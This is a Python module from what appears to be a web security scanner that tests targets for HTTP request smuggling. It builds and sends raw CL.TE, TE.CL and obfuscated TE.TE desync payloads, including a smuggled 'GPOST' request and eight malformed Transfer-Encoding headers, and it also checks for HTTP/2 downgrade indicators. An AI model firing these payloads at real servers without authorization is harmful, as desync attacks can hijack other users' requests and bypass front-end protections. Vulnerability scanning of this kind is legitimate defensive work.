"""HTTP Request Smuggling — CL.TE, TE.CL, TE.TE desync attacks."""

import aiohttp
import asyncio
import time
from urllib.parse import urlparse
from modules.core import console

async def _raw_request(host, port, data, use_ssl=False, timeout=8):
    """Send raw HTTP request via socket for smuggling tests."""
    try:
        if use_ssl:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=ctx), timeout=timeout)
        else:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=timeout)

        writer.write(data.encode())
        await writer.drain()

        response = b''
        try:
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                if not chunk:
                    break
                response += chunk
        except (asyncio.TimeoutError, ConnectionError):
            pass

        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

        return response.decode('utf-8', errors='replace')
    except Exception as e:
        return f'ERROR: {str(e)}'


async def _test_cl_te(session, url):
    """Test CL.TE request smuggling."""
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname
    port = 443 if parsed.scheme == 'https' else 80
    use_ssl = parsed.scheme == 'https'

    smuggle_req = (
        f'POST / HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: 6\r\n'
        f'Transfer-Encoding: chunked\r\n'
        f'\r\n'
        f'0\r\n'
        f'\r\n'
        f'G'
    )

    try:
        start = time.time()
        resp1 = await _raw_request(host, port, smuggle_req, use_ssl, timeout=10)
        elapsed1 = time.time() - start

        normal_req = (
            f'GET / HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            f'Connection: close\r\n'
            f'\r\n'
        )
        start = time.time()
        resp2 = await _raw_request(host, port, normal_req, use_ssl, timeout=10)
        elapsed2 = time.time() - start

        if 'HTTP/1.1 405' in resp2 or 'Method Not Allowed' in resp2:
            findings.append({
                'type': 'CL.TE Request Smuggling',
                'severity': 'Critical',
                'detail': 'Next request received smuggled method',
                'evidence': resp2[:100],
            })
        elif elapsed1 > 5 and elapsed2 < 2:
            findings.append({
                'type': 'CL.TE Timing Anomaly',
                'severity': 'High',
                'detail': f'Smuggle req: {elapsed1:.1f}s vs normal: {elapsed2:.1f}s',
            })
    except Exception:
        pass

    return findings


async def _test_te_cl(session, url):
    """Test TE.CL request smuggling."""
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname
    port = 443 if parsed.scheme == 'https' else 80
    use_ssl = parsed.scheme == 'https'

    smuggle_req = (
        f'POST / HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: 4\r\n'
        f'Transfer-Encoding: chunked\r\n'
        f'\r\n'
        f'5c\r\n'
        f'GPOST / HTTP/1.1\r\n'
        f'Content-Type: application/x-www-form-urlencoded\r\n'
        f'Content-Length: 15\r\n'
        f'\r\n'
        f'x=1\r\n'
        f'0\r\n'
        f'\r\n'
    )

    try:
        resp = await _raw_request(host, port, smuggle_req, use_ssl, timeout=10)

        if 'GPOST' in resp or 'HTTP/1.1 405' in resp:
            findings.append({
                'type': 'TE.CL Request Smuggling',
                'severity': 'Critical',
                'detail': 'Server processed smuggled request',
            })
    except Exception:
        pass

    return findings


async def _test_te_te(session, url):
    """Test TE.TE obfuscation variants."""
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname
    port = 443 if parsed.scheme == 'https' else 80
    use_ssl = parsed.scheme == 'https'

    te_variants = [
        'Transfer-Encoding: xchunked',
        'Transfer-Encoding : chunked',
        'Transfer-Encoding: chunked\r\nTransfer-Encoding: x',
        'Transfer-Encoding:\tchunked',
        'Transfer-Encoding: \x0bchunked',
        ' Transfer-Encoding: chunked',
        'X: x\r\nTransfer-Encoding: chunked',
        'Transfer-Encoding\r\n: chunked',
    ]

    for te_header in te_variants:
        smuggle_req = (
            f'POST / HTTP/1.1\r\n'
            f'Host: {host}\r\n'
            f'Content-Type: application/x-www-form-urlencoded\r\n'
            f'Content-Length: 4\r\n'
            f'{te_header}\r\n'
            f'\r\n'
            f'0\r\n'
            f'\r\n'
        )

        try:
            start = time.time()
            resp = await _raw_request(host, port, smuggle_req, use_ssl, timeout=8)
            elapsed = time.time() - start

            if elapsed > 5:
                findings.append({
                    'type': 'TE.TE Obfuscation Accepted',
                    'severity': 'High',
                    'detail': f'Variant: {te_header.strip()[:40]}',
                    'time': round(elapsed, 2),
                })
                break
        except Exception:
            pass

    return findings


async def _test_h2_smuggle(session, url):
    """Test HTTP/2 downgrade smuggling indicators."""
    findings = []
    parsed = urlparse(url)
    host = parsed.hostname

    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=8),
                               ssl=False) as resp:
            if 'h2' in resp.headers.get('alt-svc', '') or 'h3' in resp.headers.get('alt-svc', ''):
                smuggle_headers = {
                    'Transfer-Encoding': 'chunked',
                    'Content-Length': '0',
                }
                async with session.post(url, headers=smuggle_headers,
                                        timeout=aiohttp.ClientTimeout(total=8),
                                        ssl=False) as resp2:
                    if resp2.status not in (400, 403):
                        findings.append({
                            'type': 'H2/H1 Downgrade May Be Possible',
                            'severity': 'Medium',
                            'detail': f'Server supports HTTP/2: {resp.headers.get("alt-svc", "")[:50]}',
                        })
    except Exception:
        pass

    return findings


async def scan_http_smuggle(session, url):
    """HTTP request smuggling scanner."""
    console.print(f"\n[bold cyan]--- HTTP Request Smuggling ---[/bold cyan]")
    all_findings = []

    console.print(f"  [cyan]Testing CL.TE desync...[/cyan]")
    clte = await _test_cl_te(session, url)
    all_findings.extend(clte)
    for f in clte:
        console.print(f"  [bold red]⚠ {f['type']}[/bold red]")

    console.print(f"  [cyan]Testing TE.CL desync...[/cyan]")
    tecl = await _test_te_cl(session, url)
    all_findings.extend(tecl)
    for f in tecl:
        console.print(f"  [bold red]⚠ {f['type']}[/bold red]")

    console.print(f"  [cyan]Testing TE.TE obfuscation (8 variants)...[/cyan]")
    tete = await _test_te_te(session, url)
    all_findings.extend(tete)

    console.print(f"  [cyan]Testing HTTP/2 downgrade...[/cyan]")
    h2 = await _test_h2_smuggle(session, url)
    all_findings.extend(h2)

    if all_findings:
        console.print(f"\n  [bold red]{len(all_findings)} smuggling vectors found![/bold red]")
    else:
        console.print(f"\n  [green]✓ No request smuggling detected[/green]")

    return {'findings': all_findings}
